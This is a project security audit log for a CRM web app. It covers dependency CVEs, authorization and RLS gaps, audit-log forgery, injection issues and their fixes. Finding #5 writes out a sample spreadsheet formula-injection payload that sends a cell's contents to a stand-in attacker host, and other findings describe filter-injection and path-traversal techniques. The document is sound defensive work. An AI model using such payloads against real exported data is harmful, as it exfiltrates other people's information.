# AFD Security — Vulnerability & Project Audit Log

Tracks findings from security/dependency scans (Trivy, npm audit, etc.) and from periodic
full-codebase audits — security, architecture, code quality, dependencies, and test
coverage — each cross-referenced against the CLAUDE.md non-negotiables. Add new findings
here as new scans/audits turn them up; move to "Resolved" once fixed and re-verified. Each
finding is written with enough file:line context to be picked up and fixed later (by AI or
a human) without re-deriving the analysis.

---

## Status at a glance — 2026-09-15

| Still open | Fixed |
|---|---|
| *(nothing — every numbered security finding is closed)* | #11 audit-log forgery (High) |
| | #2 lead-creation seatbelt (Medium, re-graded from High) |
| | #6 / #10 hand-rolled validation (Low) |
| | #3 AI analyst scoping guard (Medium) |
| | #1 PostCSS CVEs (High CVSS, low reachability) |
| | #5 CSV formula injection (Medium) · #12 filter injection (Medium) |
| | #7 silent audit-log failures (Medium) |
| | #8 tasks unaudited (Low) · #9 cron timing (Low) · #4 doc naming (Low) |

**Every numbered security finding is now closed**, and the CI job that runs the
database-backed suites exists (`.github/workflows/ci.yml`). What remains from this
audit is not code: coverage tooling, the architecture tidying in its own section, and
the edge rate-limit on the public form, which belongs in front of the application
rather than in it.

Findings kept below in their original numbering, each with its status line updated.
Full detail of what changed is in "Resolved findings" at the end.

---

## Open findings

### 1. PostCSS — bundled inside Next.js — multiple CVEs

- **Severity: HIGH** (two HIGH, two MEDIUM — see breakdown below)
- **Status:** RESOLVED 2026-09-15 — `overrides` added, nested copy gone, `npm audit` clean
- **Source:** Trivy scan of `package-lock.json`, verified against public advisories on 2026-09-15

**Where it lives**

There are two copies of `postcss` in the lockfile:

| Location | Version | Status |
|---|---|---|
| `node_modules/postcss` (top-level — used by Tailwind 4 / Vite) | `8.5.26` | Already patched, not vulnerable |
| `node_modules/next/node_modules/postcss` (bundled inside Next.js 15.5.24) | `8.4.31` | Vulnerable |

Next.js pins its internal copy to an **exact** version (`"postcss": "8.4.31"`, not a range)
in its own `package.json`. This is a Vercel/Next.js packaging choice, not something
introduced by this repo, and it's a known issue across most current Next.js 15.x projects.

**CVEs**

| CVE | Severity | Fixed in | Description |
|---|---|---|---|
| CVE-2026-45623 | HIGH | 8.5.12 | PostCSS parses `/*# sourceMappingURL=PATH */` comments from any CSS string with no scheme validation, allowlist, or traversal check, and dereferences the path against the filesystem. Lets an attacker who controls CSS input read arbitrary files (leaks first ~10 bytes via a `JSON.parse` error) and provides a file-existence oracle / DoS primitive. Reachable with PostCSS's default options — no `from`, `map`, or plugins required. |
| CVE-2026-73646 | HIGH (CVSS 7.5) | 8.5.18 | Path traversal in "previous source map" auto-loading. `loadMap()` builds the candidate path via `join(dirname(opts.from), annotation)` where `annotation` is the raw, attacker-controlled string from the CSS comment — `path.join` normalizes but doesn't sandbox `..` segments, so a `../../../` prefix walks outside the intended directory. If `opts.from` isn't set, the annotation is used unmodified (absolute path read verbatim). Affects any app processing untrusted CSS without explicitly passing `map: false`. |
| CVE-2026-41305 | MEDIUM | 8.5.10 | Cross-site scripting (XSS) via improper escaping of style closing tags. |
| CVE-2026-69153 | MEDIUM | 8.5.23 | Information disclosure via a crafted `sourceMappingURL`. |

**Exploitability in this app**

All four require PostCSS to run **attacker-controlled CSS text** through `process()`
(e.g. CMS themes, user-uploaded stylesheets, form renderers). The vulnerable copy here is
only invoked by Next.js's internal build/dev pipeline on this project's own,
developer-authored CSS (`globals.css`, Tailwind output) — AFD CRM has no feature where
leads, counsellors, or any end user submit or upload arbitrary CSS that gets run through
PostCSS at request time. **Practical exploitability today: low.** The CVSS scores above
are for the general case (untrusted CSS pipelines), not this codebase's actual attack
surface — but this should be re-assessed if any future feature (e.g. a "custom branding /
theme" admin setting, rich HTML/CSS email template editor, or file upload that touches
CSS) starts feeding external input into PostCSS.

**Fix**

Force the nested copy up via an `overrides` entry in [`package.json`](../package.json).
Safe because PostCSS maintains backward compatibility within the 8.x line, and Next only
consumes the stable public API:

```json
"overrides": {
  "postcss": "^8.5.26"
}
```

Then regenerate the lockfile (`npm install`) and re-run Trivy/`npm audit` to confirm the
nested `next/node_modules/postcss` entry disappears or resolves to a patched version.
Re-check after any Next.js version bump, since a future Next release may change or drop
its internal postcss pin.

---

## Full codebase security audit — 2026-09-15

Scope: full source audit (not a diff review) covering the four areas CLAUDE.md calls out
as security-critical — auth/RLS, webhooks/cron, financial ledger/PII, and input
validation/injection surfaces. Performed by four parallel code-reading passes over
`src/` and `src/lib/db/migrations/*.sql`; every finding below cites the actual file/line
read, not a theoretical concern. This section is written to be picked up and fixed later
(by AI or a human) without re-running the audit — each finding has enough context to act
on directly.

**Summary table**

| # | Area | Severity | File(s) | One-line issue |
|---|---|---|---|---|
| 2 | Auth/RLS | **High** | `src/lib/identity/resolve-or-create-lead.ts`, `src/app/(app)/leads/new/actions.ts`, `src/app/(app)/leads/import/actions.ts` | Lead creation from two browser-facing Server Actions runs on an RLS-bypassing raw DB client; scope checks are hand-rolled app code with no Postgres backstop |
| 3 | Auth/RLS | Medium | `src/lib/ai/tools/*`, `src/lib/ai/tools/scope.ts` | AI analyst centre-scoping is enforced only in app code against the same RLS-bypassing client — correct today, no DB-level safety net for future tools |
| 4 | Auth/RLS | Low | CLAUDE.md vs. code | Docs describe a permission function `auth_has(permission, scope)` that doesn't exist; actual functions are `auth_scope()` / `can_access_center()` |
| 5 | Input validation | **Medium** | `src/app/(app)/leads/actions.ts:77-80` | CSV lead export has no spreadsheet formula-injection escaping (`=`, `+`, `-`, `@` prefixes) |
| 6 | Input validation | Low | `leads/new/actions.ts`, `leads/[id]/actions.ts`, `accounts/[id]/actions.ts`, `whatsapp/templates/actions.ts` | Several Server Actions validate input by hand instead of zod, per project convention — not exploitable, but weaker bounds-checking |
| 7 | Financial/PII | Medium | `src/lib/audit/log.ts:47-49` | `writeAuditLog` swallows failures (`console.error` + continue) instead of surfacing/alerting — a DB hiccup can silently produce an audit-log gap on a real mutation |
| 8 | Financial/PII | Low | `src/app/(app)/leads/[id]/actions.ts` (`createTask`/`completeTask`) | Task create/complete mutations aren't written to `audit_log` |
| 9 | Webhooks/Cron | Low | All `src/app/api/cron/*` routes | Cron secret compared with `!==` instead of `timingSafeEqual` (negligible over HTTPS, flagged for completeness) |
| 10 | Webhooks/Cron | Low | `src/lib/profile-form/submit.ts:16-30` | Public profile-form submission uses manual type coercion instead of zod (no injection risk — writes go into a `jsonb` column — but weaker data-quality guarantees) |
| 11 | Auth/RLS, Audit | **High** | `src/lib/db/migrations/0001_functions_and_rls.sql:502-504`, `src/lib/audit/log.ts:38-45` | `audit_log` INSERT policy is `with check (true)` with no trigger binding `actor_id` to `auth.uid()` — any authenticated user can forge audit rows attributed to someone else |
| 12 | Input validation | Medium | `src/app/(app)/leads/page.tsx:135`, `src/app/(app)/students/page.tsx:57` | User-supplied `search` string interpolated unescaped into a PostgREST `.or()` filter expression — filter-string injection, bounded by RLS but unhandled |

No High-severity findings in webhooks/cron or financial/PII — those two areas matched the
CLAUDE.md mandate closely (HMAC-then-persist-then-process ordering, non-2xx on failure,
append-only ledger with gapless sequences, phone masking + audit-on-reveal, private
storage buckets with properly-scoped signed URLs all verified against real code, not just
docs). Full detail below.

---

### 2. Lead creation bypasses RLS via a raw DB client (High → re-graded Medium)

- **Severity: Medium** (downgraded from High on 2026-09-15 re-verification — see "Re-grading" below)
- **Status:** RESOLVED 2026-09-15 — `lib/identity/assert-lead-visible.ts`, wired into both callers
- **Category:** Authorization / access control

`src/lib/db/client.ts` exports a raw `postgres-js`/Drizzle connection (`db`) over
`DATABASE_URL`. Its own comment documents that this bypasses Supabase Auth entirely — no
RLS-friendly JWT is attached to these queries (`client.ts:18-22`).

`resolveOrCreateLead()` (`src/lib/identity/resolve-or-create-lead.ts:75-369`), which
performs the `leads` insert, runs entirely on this `db` client. That's the correct choice
for its original intended callers — webhooks and cron jobs, which the CLAUDE.md
non-negotiables explicitly say may use the service-role/unrestricted path. But it is also
called directly from two **browser-reachable Server Actions**:

- `src/app/(app)/leads/new/actions.ts:63` — `createLeadManually` (`"use server"`)
- `src/app/(app)/leads/import/actions.ts:171` — `importLeads` (`"use server"`)

Both files' own comments admit the implication: *"unlike every other mutation in this
app, RLS is NOT the backstop here. This action is the enforcement point instead"*
(`leads/new/actions.ts:17-20`, `leads/import/actions.ts:52-55`). The scope checks —
`scopeFor`, `user.centerIds.includes(centerId)`, forcing `assignedTo = user.id` for `own`
scope — duplicate in hand-written TypeScript exactly what the `leads_insert` RLS policy
(`can_access_center('lead.create', center_id, assigned_to)`, migration
`0005_leads_rls.sql:95-97`) already enforces for every other write path in the app.

**Why this matters:** CLAUDE.md's non-negotiable #3 is explicit — *"App code must never
be the only thing standing between a counsellor and another counsellor's leads."* Here it
is exactly that, for the two most direct lead-creation UIs in the product (manual entry
and CSV import). A bug in the duplicated scope logic — or a future contributor calling
`resolveOrCreateLead()` from a new Server Action without re-implementing the same checks,
since it's an exported, generically-callable function with no compiler-enforced caller
restriction — lets a counsellor create or attach leads to a centre/owner outside their
access, with zero database-level enforcement to catch the mistake.

**Exploit scenario:** A counsellor scoped to Kannur only finds (via a bug, a future
refactor, or a crafted request that skips a client-side guard) a way to call
`createLeadManually`/`importLeads` with a Kochi `centerId`. Nothing in Postgres stops the
insert — the check that would normally block it (the RLS policy) is never evaluated
because the query runs on the RLS-bypassing client. The lead is created attributed to
Kochi, in Kannur's counsellor's name to work.

**Re-grading (2026-09-15).** The facts are correct and were re-verified: both Server
Actions do run on the RLS-bypassing client, and the scope checks are hand-written
TypeScript. What makes this Medium rather than High is that there is no *current* path
by which a counsellor creates a lead outside their scope — the finding's own exploit
scenario is conditional on "a bug, a future refactor, or a crafted request that skips a
client-side guard". It is a missing safety net, not an open door.

Also: recommended fix (1) as written cannot work. `resolveOrCreateLead()` needs one
transaction spanning `leads`, `lead_identifiers`, `enquiries` and `merge_review_queue`,
and takes a `FOR UPDATE` lock in the round-robin path; PostgREST cannot express that.
Fix (2) — re-read the created row through the caller's own RLS-bound client and fail
loudly if it is not visible — is the practical version and the one to build. Fix (3),
the "webhook/cron only" comment, is free and should happen at the same time.

**Recommended fix (to be implemented later):**
1. Preferred: route these two Server Actions through the caller's own RLS-bound Supabase
   client for the actual `leads` insert (keep `resolveOrCreateLead`'s dedup/enquiry-linking
   logic, but parameterize which DB client it uses, defaulting to the RLS-bound one for
   user-triggered calls and only using the raw `db` client for genuine webhook/cron
   callers).
2. If (1) is impractical because `resolveOrCreateLead` needs cross-table transactional
   guarantees the RLS client can't give it, at minimum: add a second, independent
   assertion immediately after the insert — re-fetch the created row through the caller's
   RLS-bound client and 500/rollback if it isn't visible (i.e. would have been rejected by
   RLS). This converts "RLS is silently never checked" into "RLS is checked as a
   belt-and-braces assertion," closing the gap non-negotiable #3 is meant to prevent.
3. Add a code comment / lint rule flagging `resolveOrCreateLead` and the raw `db` client
   as "webhook/cron only" so a future Server Action doesn't repeat this pattern.

---

### 3. AI analyst centre-scoping has no RLS backstop (Medium)

- **Severity: Medium**
- **Status:** RESOLVED 2026-09-15 — `tests/ai-tool-scoping.spec.ts` fails the build if a tool skips scoping
- **Category:** Authorization / access control

Every tool in `src/lib/ai/tools/index.ts` (`leads_by_source`, `funnel_snapshot`,
`conversion_by_counsellor`, `centre_performance`, `lost_reason_breakdown`,
`sla_breaches`, `pipeline_value`, `list_centres`) correctly applies
`leadScopeWhere(ctx.user)` / `allowedCenterIds` before querying, and `find_person` /
`person_history` (`src/lib/ai/tools/person-history.ts`) are correctly gated behind
`refuseUnlessOrgWide` so only `all`-scope callers can reach them
(`src/lib/ai/tools/index.ts:118,144`). Today, every tool does the right thing.

The gap: all of this runs on the same RLS-bypassing `db` client from finding #2. Scoping
is enforced purely by application code calling `leadScopeWhere()` correctly — there is no
Postgres-level check that would catch a future tool added to `ANALYST_TOOLS` that forgets
to call it. Per CLAUDE.md, *"a centre head asking how did Kochi do when they only own
Kannur must get nothing"* — currently true, but enforced by convention/code-review
discipline rather than by the database, which is exactly the class of failure RLS exists
to prevent.

**Recommended fix:** either (a) run analyst tool queries through the RLS-bound client
using the caller's own session (would require restructuring the aggregate queries to be
expressible under the existing lead RLS policies), or (b) if that's impractical for
performance/aggregation reasons, add an automated test that asserts every entry in
`ANALYST_TOOLS` calls `leadScopeWhere`/`allowedCenterIds` (or is explicitly allow-listed
as org-wide via `refuseUnlessOrgWide`), so a future addition can't silently skip scoping.

---

### 4. Documentation names a permission function that doesn't exist (Low)

- **Severity: Low**
- **Status:** RESOLVED 2026-09-15 — CLAUDE.md now names `auth_scope()` / `can_access_center()`
- **Category:** Documentation accuracy

CLAUDE.md says RLS policies call `auth_has('lead.read','center')`. The actual functions
implementing this concept are `auth_scope(perm)` and
`can_access_center(perm, center_id, owner_id)`
(`src/lib/db/migrations/0001_functions_and_rls.sql:28,50`), used consistently everywhere.
Functionally equivalent, purely a naming mismatch — but worth fixing so a future
contributor (human or AI) grepping for `auth_has` per CLAUDE.md doesn't conclude the
non-negotiable was never implemented.

**Fix:** Update CLAUDE.md's permissions section to reference `auth_scope()` /
`can_access_center()` by their real names, or rename the SQL functions to match the doc
(prefer updating the doc — renaming a widely-used SQL function is higher risk for no
behavioural gain).

---

### 5. CSV lead export is vulnerable to spreadsheet formula injection (Medium)

- **Severity: Medium**
- **Status:** RESOLVED 2026-09-15 — `src/lib/format/csv.ts` + `tests/csv-escape.spec.ts`
- **Category:** Injection (CSV/formula injection)

`src/app/(app)/leads/actions.ts:77-80`:

```js
function csvEscape(value: string): string {
  if (/[",\n]/.test(value)) return `"${value.replace(/"/g, '""')}"`;
  return value;
}
```

This only escapes CSV syntax (quotes/commas/newlines) — it does not neutralize
spreadsheet formula injection. Any lead field beginning with `=`, `+`, `-`, or `@` passes
into the exported CSV unmodified (`actions.ts:128-140`). Several of the fields exported
(student name, city, school, discount name, custom fields) are populated from **public,
unauthenticated lead-gen sources** — the Google Leads and Meta Lead Ads webhooks
(`src/app/api/webhooks/google-leads`, `meta-leads`) — meaning the content originates
outside the organisation's control.

**Exploit scenario:** An attacker submits a lead via the public Meta/Google lead-ad flow
(or any other inbound source that reaches `resolveOrCreateLead`) with, e.g.,
`studentName = "=HYPERLINK(\"http://evil.example/\"&A1,\"click\")"` or a legacy DDE
payload. A staff member later exports leads to CSV (a routine, frequent operation per
CLAUDE.md's audit-log requirement on exports) and opens the file in Excel/Google Sheets
with default settings — the formula executes, potentially exfiltrating data or chaining
into a further attack via the DDE/HYPERLINK vector.

**Fix:** In `csvEscape`, if the value's first character is one of `= + - @` (or a tab/CR
that a spreadsheet app might still interpret), prefix the cell with a `'` (Excel/Sheets
convention for "treat as literal text") before applying the existing quote-escaping. This
is a same-file, few-line change:

```js
function csvEscape(value: string): string {
  if (/^[=+\-@\t\r]/.test(value)) value = `'${value}`;
  if (/[",\n]/.test(value)) return `"${value.replace(/"/g, '""')}"`;
  return value;
}
```

---

### 6. Several Server Actions validate input by hand instead of zod (Low)

- **Severity: Low**
- **Status:** RESOLVED 2026-09-15 — `lib/fields/parse-field-value.ts` + zod on `createLeadManually`
- **Category:** Input validation (defense-in-depth / convention drift, not directly exploitable)

Project convention (CLAUDE.md "Conventions") is "all input validated with zod at the
boundary." These Server Actions deviate — not injectable (all downstream writes go
through parameterized Drizzle/Supabase calls), but weaker on bounds-checking and
type-correctness than the stated convention:

- `src/app/(app)/leads/new/actions.ts:23-84` (`createLeadManually`) — manual
  `typeof === "string"` / `.trim()` checks on `FormData`, no length caps or format
  validation (e.g. `examYear`, `email` accepted as any string).
- `src/app/(app)/leads/[id]/actions.ts:33-116` (`updateLead`) — hand-coerces
  `number`/`boolean`/`multiselect` fields (`Number(raw)` with no `NaN`/range guard), so a
  malformed number can be silently stored as `NaN` or an out-of-range value.
- `src/app/(app)/accounts/[id]/actions.ts:37-100` (`recordPaymentAction`) — manual but
  reasonably rigorous (`parseRupeesToPaise` bounds-checks, `isPaymentMethod()`
  enum-check) — lower priority than the two above.
- `src/app/(app)/whatsapp/templates/actions.ts:70-99` (`submitTemplate`) — manual
  name/category/body checks before forwarding to Meta's Graph API.

**Fix:** Introduce zod schemas for each of these actions' input shapes, inferring the
TypeScript type from the schema per the project's stated convention, prioritizing
`createLeadManually` and `updateLead` since they're the highest-traffic, most
field-diverse mutation paths (and `updateLead` in particular should reject `NaN`/malformed
numeric input rather than silently storing it).

---

### 7. Audit log writes fail silently (Medium)

- **Severity: Medium**
- **Status:** RESOLVED 2026-09-15 — failures now go to `captureError()` / Platform Health
- **Category:** Audit/observability gap

`src/lib/audit/log.ts:47-49` — `writeAuditLog` catches a failed insert, does
`console.error(...)`, and returns normally rather than throwing or otherwise surfacing
the failure. This is a deliberate trade-off documented in the code's own comment (don't
fail the underlying business mutation just because audit logging failed), which is a
reasonable design choice on its own — but as implemented, a transient DB error or RLS
denial on the `audit_log` insert leaves the real mutation (a lead update, a payment
record, a CSV export with revealed phone numbers) fully committed with **no audit trail
and no alert**, visible only in server logs if anyone is watching them.

This directly undercuts non-negotiable #5 (*"Every mutation writes to audit_log"*) under
failure conditions — the mutation succeeds, the guarantee silently doesn't hold.

**Fix:** Keep the "don't block the mutation" behavior, but make the failure observable:
push failed audit-log attempts to a dead-letter table or a monitored error-reporting
channel (the codebase already has `src/app/api/report-error` — route audit-log failures
there, or to whatever alerting exists), so a spike in audit-log failures gets caught
rather than living only in `console.error` output.

---

### 8. Task create/complete mutations aren't audited (Low)

- **Severity: Low**
- **Status:** RESOLVED 2026-09-15 — `task.create` / `task.complete` audit rows added
- **Category:** Audit coverage gap

`createTask` and `completeTask` in `src/app/(app)/leads/[id]/actions.ts:214-254` insert/
update `tasks` rows with no corresponding `writeAuditLog` call, unlike every other
mutation site checked (finance actions, payment recording, lead updates, CSV export all
call it). Tasks are a comparatively minor entity, so this is Low severity, but it's a
literal gap against non-negotiable #5's "every mutation" wording.

**Fix:** Add `writeAuditLog` calls to `createTask`/`completeTask` for consistency, or
explicitly document (in CLAUDE.md or a code comment) that `tasks` is intentionally
excluded from the audit-log mandate and why.

---

### 9. Cron secret comparison isn't constant-time (Low)

- **Severity: Low**
- **Status:** RESOLVED 2026-09-15 — `src/lib/cron/require-secret.ts`, used by all 10 routes
- **Category:** Timing side-channel (defense-in-depth)

Every route under `src/app/api/cron/*` (all ten subdirectories) is correctly gated
by an identical guard, e.g. `sla-sweep/route.ts:41-43`:

```js
const secret = process.env.CRON_SECRET;
if (!secret || request.headers.get("authorization") !== `Bearer ${secret}`) return 401;
```

None of these endpoints are open to the internet — this is a well-implemented, consistent
pattern. The only nit: `!==` is a short-circuiting string comparison, not constant-time,
which is a negligible timing side-channel over HTTPS for a long random secret, but cheap
to fix for defense-in-depth.

**Fix:** Compare with `crypto.timingSafeEqual` (length-checked first, as already done
correctly for the Meta/WhatsApp HMAC and Google webhook shared-secret checks elsewhere in
the codebase — this would just bring cron auth in line with the pattern already used for
webhook auth).

---

### 10. Public profile-form submission uses manual coercion instead of zod (Low)

- **Severity: Low**
- **Status:** RESOLVED 2026-09-15 — same parser as the counsellor's edit form
- **Category:** Input validation (data quality, not injection)

`src/lib/profile-form/submit.ts:16-30` (`readValue`) manually trims strings, coerces
numbers via `Number()`/`Number.isFinite`, and coerces booleans/multiselects, instead of
using zod per-field-type schemas. The submission token itself is safe (32-byte CSPRNG,
exact-match lookup, no IDOR — confirmed at `src/lib/profile-form/actions.ts:24-26` and
`get-form.ts:46-58`), and the write goes into a single `jsonb` column via a parameterized
Drizzle update (`submit.ts:84-91`), so there's no injection risk. The only consequence is
data quality: a string submitted into a "number" field is silently dropped to `null`
instead of being rejected with a clear error.

**Fix:** Add zod validation keyed off each field's configured type
(`field_definitions.type`) before the `jsonb` write, so malformed submissions are
rejected/flagged rather than silently nulled — this is the same fix direction as finding
#6, applied to the one public-facing (unauthenticated, token-gated) form in the product.

---

### 11. `audit_log` rows can be forged by any authenticated user (High)

- **Severity: High**
- **Status:** RESOLVED 2026-09-15 — migration 0068 `enforce_audit_actor` trigger + 3 RLS tests
- **Category:** Authorization / non-repudiation

The `audit_log_insert` RLS policy (`src/lib/db/migrations/0001_functions_and_rls.sql:502-504`)
is `with check (true)` for every authenticated role, and `writeAuditLog()`
(`src/lib/audit/log.ts:38-45`) inserts client-influenced `actor_id`, `action`,
`entity_type`, `before`, and `after` values with no database trigger tying `actor_id` to
`auth.uid()`.

**Why this matters:** any authenticated user — any role, any scope — can call the
Supabase REST API directly (bypassing the app's own `writeAuditLog()` call sites entirely)
and insert an arbitrary row into `audit_log`: a forged entry attributing a real action
(an export, a phone reveal, a payment reversal) to a *different* user, a fabricated entity
reference, or simple noise to bury a real entry. This defeats exactly the guarantee
non-negotiable #5 exists for — the "counsellors leave and take databases with them"
accountability model this table was built to solve (the same failure class as v1 audit
item O1, just moved into the append-only ledger meant to fix it).

**Fix:** Add a `BEFORE INSERT` trigger on `audit_log` that rejects the insert unless
`auth.uid() is null` (service-role/system writes from webhooks/cron) or
`new.actor_id is not distinct from auth.uid()`. Mirror the existing
`prevent_self_privilege_escalation` trigger pattern already present in the same migration
file, so authenticated users can only ever write audit rows attributed to themselves.

---

### 12. Unescaped search input enables PostgREST filter-string injection (Medium)

- **Severity: Medium**
- **Status:** RESOLVED 2026-09-15 — `src/lib/db/filter-term.ts`, applied at all 3 search sites
- **Category:** Injection (query filter injection)

`src/app/(app)/leads/page.tsx:135` and `src/app/(app)/students/page.tsx:57` interpolate a
user-supplied `search` string directly into a PostgREST filter expression, e.g.:

```js
query.or(`student_name.ilike.%${search}%,primary_phone.ilike.%${search}%`)
```

Commas, parentheses, and filter operators in `search` are not stripped or escaped before
interpolation, so a user can inject additional clauses into the `or()` expression. This is
bounded by RLS (a user still can't see rows outside their scope), but it lets a user
manipulate the query beyond the intended two-column search — forcing extra `or`/`and`
branches, referencing arbitrary columns, or crafting malformed filters that error out
(a minor DoS). No escaping helper exists anywhere in the codebase for this — it's simply
unhandled, not an inconsistency with an established pattern.

**Fix:** Strip or percent-encode `, ( ) % *` from `search` before interpolating it into
the filter string, or build the filter as two chained `.ilike()` calls combined via an
array-based `.or()` that the Supabase client escapes for you, rather than hand-building
the filter string.

---

## Architecture review — 2026-09-15

Compared the actual codebase structure/behavior against the architecture CLAUDE.md
mandates (the ten non-negotiables, the directory layout, the lifecycle chain). **No
Critical or High findings — all ten non-negotiables are honored in the code checked.**

| Severity | Location | Issue | Fix |
|---|---|---|---|
| Medium | `docs/PROGRESS.md` (e.g. session numbers 1, 3, 33-44 each appear twice, at differing line ranges) | Two branches each numbered sessions from scratch and were merged (git log shows parallel PRs, e.g. #34/#35) without reconciliation, breaking the single-timeline handoff record the "Working style" section relies on. | Renumber into one true chronological sequence (or switch to date-only headers); consider a pre-merge check that rejects a reused session number. |
| Low | `CLAUDE.md` stack table ("AI: `@anthropic-ai/sdk`, `claude-sonnet-4-6`") vs. `src/lib/ai/gemini.ts`, `src/app/api/ai/query/route.ts`, `package.json` (no `@anthropic-ai/sdk` dependency at all) | The `/ask` analyst actually runs on Google Gemini via raw REST calls — a real, deliberate, documented decision (`docs/DECISIONS.md`, 2026-09-03: free tier, no per-query charges) — but CLAUDE.md's stack table was never updated to match, so it now states something false about the shipped stack. | Update CLAUDE.md's stack table AI row to name Gemini and point to the DECISIONS.md rationale, so future sessions aren't misled into re-adding `@anthropic-ai/sdk`. |
| Low | `src/app/api/webhooks/` (contains only `meta-leads`, `google-leads`, `whatsapp`) | CLAUDE.md's directory layout and `docs/02-BUILD-PHASES.md` Phase 2 both name `website/` and `knorish/` webhook handlers that don't exist. Not a bug — nothing bypasses the single ingestion path — just an open item that risks being silently dropped. | Confirm whether website-forms/Knorish ingestion is still in scope; schedule it or remove it from CLAUDE.md's directory layout. |
| Low | `src/lib/db/schema/finance.ts` (18KB — `students`, `batches`, `studentBatches`, `enrolments`, `payments`, `receipts`, `feeStructures` all in one file) | `docs/01-DATA-MODEL.md`'s own convention is "one file per group"; academics-owned tables (`students`, `batches`) living in a file named for the finance domain blurs the Sales→Accounts→Academics separation the schema is meant to make visible. | Split `students`/`batches`/`studentBatches` into their own `src/lib/db/schema/academics.ts`, keeping existing FKs to `leads`/`enrolments`. |

**Verified clean (no drift):** single ingestion path (`resolveOrCreateLead()` →
`applyAssignment()`) used by every source with no shortcuts; no duplicate-rejection
anywhere; `stage_id`/`temperature` genuinely independent columns; assignment engine is a
real JSONB-conditions + priority table, not hardcoded logic; `students` is a separate
table linked via `lead_id`, not a flag on `leads`; zero hardcoded `role === 'admin'`
checks; config export/import satisfies the Phase 1 plug-and-play test; webhooks verify →
persist → process in order with `webhook_events` idempotency; no client component imports
the DB or service-role client directly.

---

## Code quality review — 2026-09-15

`tsc --noEmit` passes with zero errors; `eslint src --max-warnings=0` reports zero
problems in application code (all lint issues repo-wide live in `.claude/helpers/*.cjs`
tooling scaffolding, not `src/`); no `any`/`@ts-ignore` in real code; no TODO/FIXME/HACK
markers; `docs/PROGRESS.md`/`docs/DECISIONS.md` are current; money consistently uses
`bigint(..., {mode:"number"})` paise columns with a single `formatINR()` helper, per
convention. **No Critical or High findings** — no swallowed exceptions, no catch-and-200
patterns, no missing zod validation at a boundary that isn't already tracked above, no
client components used where server components would suffice.

| Severity | Location | Issue | Fix |
|---|---|---|---|
| Medium | `src/app/api/cron/{sla-sweep,payment-reminders,recompute-temperature,google-conversions,whatsapp-flows,retargeting-sync/google,retargeting-sync/meta,whatsapp-broadcast-sweep,ad-spend-sync/google,ad-spend-sync/meta}/route.ts` (10 files) | Identical `CRON_SECRET` bearer-token check copy-pasted verbatim into all 10 cron route handlers with no shared helper. | Extract `requireCronSecret(request: Request): NextResponse \| null` into `src/lib/auth/` or `src/lib/cron/` and call it at the top of each handler. (Pair with security finding #9's constant-time-compare fix while touching this.) |
| Low | `src/lib/whatsapp/flow-runner.ts:404,414,436` | Repeated inline unsafe-ish casts (`(current.config as { tagId?: unknown }).tagId`, etc.) to read fields off a JSONB `config` column, each call site re-declaring its own ad hoc shape. | Add small typed accessor helpers (e.g. `configString(config, key)`) in `flow-engine.ts` alongside the existing `FlowStep` types; use at all three call sites. |
| Low | `src/lib/whatsapp/flow-runner.ts:307-470` (`runOne`) | 163-line function with a 7-case switch handling every step kind inline; correct and well-commented, but long enough to make the run loop harder to scan. | Optional: extract each `case` body into a named handler (`handleSendTemplate`, `handleWait`, etc.); not urgent. |

---

## Dependency analysis — 2026-09-15

Scope: `package.json`/`package-lock.json` (659 resolved packages), `npm audit`, and a grep
of `src/`/`tests/`/`scripts/` for actual usage of every declared dependency. The PostCSS
finding is tracked as finding #1 above; new items below.

| Severity | Package | Issue | Fix |
|---|---|---|---|
| Medium | `esbuild` (transitively via `drizzle-kit@0.31.10` → deprecated `@esbuild-kit/core-utils`/`@esbuild-kit/esm-loader` → `esbuild@~0.18.20`) | Moderate CWE-346: esbuild's dev server accepts requests from any website (GHSA-67mh-4wv8-2f99), range `<=0.24.2`. `drizzle-kit@0.31.10` is the latest release and still pulls this deprecated chain — no newer `drizzle-kit` fixes it. Dev-only blast radius (`drizzle-kit studio`/local tooling, not production). | Add `"overrides": { "esbuild": "^0.25.0" }` to `package.json`, `npm install`, confirm `drizzle-kit studio` still works. |
| Medium | `react-hook-form` (`^7.86.0`), `@hookform/resolvers` (`^5.9.1`) | Zero imports anywhere in `src/`/`tests/` (`useForm`, `zodResolver`, `Controller` all absent) — all forms use `"use client"` + `useActionState` + Server Actions + zod directly instead. Dead weight in every install. | `npm uninstall react-hook-form @hookform/resolvers` |
| Low | `eslint` (`^9`, resolved 9.39.5; latest 10.10.0) | One major behind, but `eslint-config-next@15.5.24` targets the eslint 9 line. | Hold; bump together with a future Next 16 upgrade. |
| Low | `vitest` (`^4.1.11`; latest 5.0.0) | One major behind. | Low priority; verify Vite major compatibility before bumping. |
| Low | `@supabase/supabase-js` (2.112.4 → 2.116.0), `@supabase/ssr` (0.12.5 → 0.12.7) | Minor/patch drift, no known CVEs. | `npm install @supabase/supabase-js@2.116.0 @supabase/ssr@0.12.7` |
| Low | `zod` (4.4.3→4.6.5), `react`/`react-dom` (19.1.0→19.3.0), `lucide-react` (1.34.0→1.46.0), `@types/react`/`@types/react-dom` (→19.3.0) | Routine minor/patch drift. | `npm install zod@4.6.5 react@19.3.0 react-dom@19.3.0 lucide-react@1.46.0 @types/react@19.3.0 @types/react-dom@19.3.0` |
| Low | `tw-animate-css` (in `dependencies`) | Only ever consumed via `@import "tw-animate-css";` in `src/app/globals.css:2` — a Tailwind build-time asset exactly like `tailwindcss` itself (correctly a devDependency). Miscategorized, bloats production `dependencies`. | Move to `devDependencies`. |
| Low | No `engines` field, no `.nvmrc` | Local Node is v24.14.0 but `@types/node` is pinned `^20`; nothing pins the Node version for other contributors/CI. | Add `"engines": { "node": ">=20" }` to `package.json`, add a `.nvmrc`, align `@types/node` major to the intended Node target. |
| Info (repo hygiene) | `.agents/`, `.claude-flow/`, `.swarm/`, `.mcp.json`, `ruvector.db` (1.5MB binary), `skills-lock.json` (257KB) | Untracked (`??` in `git status`) and not covered by `.gitignore` (only `.claude-flow/data\|logs\|sessions` subpaths are ignored). Confirmed unreferenced by application code — agent-tooling runtime artifacts, not app dependencies. A broad `git add -A` would commit a 1.5MB binary DB into the app repo. | Add `.agents/`, `.claude-flow/`, `.swarm/`, `ruvector.db`, `skills-lock.json` to `.gitignore`. `.mcp.json` is a judgment call — keep tracked only if the team wants MCP server config shared repo-wide. |

**Clean:** no duplicate/overlapping libraries, no git-URL or non-standard-registry
dependencies, peer deps resolve without conflicts (React 19.1.0 + Next 15.5.24 +
`@radix-ui/*`; Tailwind v4 + `@tailwindcss/postcss` v4), `dependencies`/`devDependencies`
otherwise correctly categorized, no Critical-severity dependency issues.

---

## Test coverage gaps — 2026-09-15

